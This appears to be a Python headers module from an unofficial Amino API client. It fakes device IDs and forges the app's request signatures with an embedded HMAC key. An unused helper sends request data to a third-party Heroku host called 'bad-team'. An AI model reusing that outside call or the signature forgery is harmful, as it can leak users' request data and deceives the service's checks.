import base64
import hmac
from hashlib import sha1
import requests
from typing import Union
from . import device
sid = None
def sigg(data) -> str:
        key='F8E7A61AC3F725941E3AC7CAE2D688BE97F30B93'
        mac = hmac.new(bytes.fromhex(key), data.encode("utf-8"), sha1)
        digest = bytes.fromhex("42") + mac.digest()
        return base64.b64encode(digest).decode("utf-8")
def signg(data) -> str:
    return requests.post(f"https://bad-team.herokuapp.com/lool?data={data}").text
class Headers:
    def __init__(self, data = None, type = None, deviceId: str = None, sig: str = None):
        if deviceId:
            dev = device.DeviceGenerator(deviceId=deviceId)
        else:
            dev = device.DeviceGenerator()

        headers = {
            "NDCDEVICEID": dev.device_id,
            "Accept-Language": "en-US",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": dev.user_agent,
            "Host": "service.narvii.com",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive"
        }

        if data: headers["Content-Length"] = str(len(data))
        if sid: headers["NDCAUTH"] = f"sid={sid}"
        if type: headers["Content-Type"] = type
        if sig: headers["NDC-MSG-SIG"] = sig
        if data is not None and sig is None and isinstance(data, bytes) is False: headers["NDC-MSG-SIG"] = sigg(data)
        self.headers = headers
